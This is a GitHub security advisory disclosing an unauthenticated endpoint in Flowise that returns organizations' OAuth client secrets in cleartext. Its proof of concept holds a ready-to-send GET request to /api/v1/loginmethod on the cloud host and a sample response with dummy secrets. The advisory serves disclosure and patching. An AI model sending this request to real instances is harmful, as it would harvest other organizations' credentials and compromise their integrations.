# [M] Flowise: Unauthenticated Information Disclosure of OAuth Secrets (Cleartext) via GET Request

## Summary
Severity: Medium
Advisory: GHSA-6pcv-j4jx-m4vx
CVE: CVE-2026-56270
CWE: CWE-306, CWE-312
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-6pcv-j4jx-m4vx
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.0

## Details
### Summary
I have discovered a critical Missing Authentication vulnerability on the /api/v1/loginmethod endpoint. The API allows unauthenticated users (guests) to retrieve the full SSO configuration of any organization by simply providing an organizationId. The response includes sensitive OAuth credentials (Client Secrets) in cleartext.


### PoC
The following request can be sent by anyone on the internet without any cookies or authorization headers.

Request
```http
GET /api/v1/loginmethod?organizationId=<any_organization_id> HTTP/2
Host: cloud.flowiseai.com
Accept: application/json
Content-Type: application/json
```

Response: The server returns 200 OK with sensitive credentials:
```json
{
  "providers": [
    {
      "id": "a04ba769-b810-481d-8d6b-84f8c377dea5",
      "organizationId": "bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d",
      "name": "azure",
      "config": {
        "tenantID": "",
        "clientID": "",
        "clientSecret": ""
      },
      "status": "disable",
      "createdDate": "2025-12-26T18:52:33.453Z",
      "updatedDate": "2025-12-26T19:31:56.087Z",
      "createdBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2",
      "updatedBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2"
    },
    {
      "id": "eda8bd90-1c45-4aca-933f-3a53d9be4161",
      "organizationId": "bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d",
      "name": "google",
      "config": {
        "clientID": "123455",
        "clientSecret": "123455"
      },
      "status": "enable",
      "createdDate": "2025-12-26T18:52:33.453Z",
      "updatedDate": "2025-12-26T19:31:56.087Z",
      "createdBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2",
      "updatedBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2"
    },
    {
      "id": "0d238df0-c89c-4733-bf57-6ec06f58c7e7",
      "organizationId": "bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d",
      "name": "auth0",
      "config": {
        "domain": "",
        "clientID": "",
        "clientSecret": ""
      },
      "status": "disable",
      "createdDate": "2025-12-26T18:52:33.453Z",
      "updatedDate": "2025-12-26T19:31:56.087Z",
      "createdBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2",
      "updatedBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2"
    },
    {
      "id": "e060ae88-c7f4-4b7c-9bdc-5321963a1648",
      "organizationId": "bd2b74e0-e0cd-4bb5-ba98-3cc2ae683d5d",
      "name": "github",
      "config": {
        "clientID": "",
        "clientSecret": ""
      },
      "status": "disable",
      "createdDate": "2025-12-26T18:52:33.453Z",
      "updatedDate": "2025-12-26T19:31:56.087Z",
      "createdBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2",
      "updatedBy": "6ab311fa-0d0a-4bd6-996e-4ae721377fb2"
    }
  ],
  "callbacks": [
    {
      "providerName": "azure",
      "callbackURL": "https://cloud.flowiseai.com/api/v1/azure/callback"
    },
    {
      "providerName": "google",
      "callbackURL": "https://cloud.flowiseai.com/api/v1/google/callback"
    },
    {
      "providerName": "auth0",
      "callbackURL": "https://cloud.flowiseai.com/api/v1/auth0/callback"
    },
    {
      "providerName": "github",
      "callbackURL": "https://cloud.flowiseai.com/api/v1/github/callback"
    }
  ]
}
```
### Affected Deployments
- FlowiseAI Cloud (cloud.flowiseai.com)
- Self-hosted FlowiseAI instances where the /api/v1/loginmethod endpoint is exposed

### Impact
An unauthenticated attacker can harvest sensitive API secrets (Google, Microsoft, GitHub Client Secrets) from any organization on the cloud platform. This leads to complete compromise of the organization's third-party integrations and potential data breaches.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6pcv-j4jx-m4vx
- https://github.com/FlowiseAI/Flowise
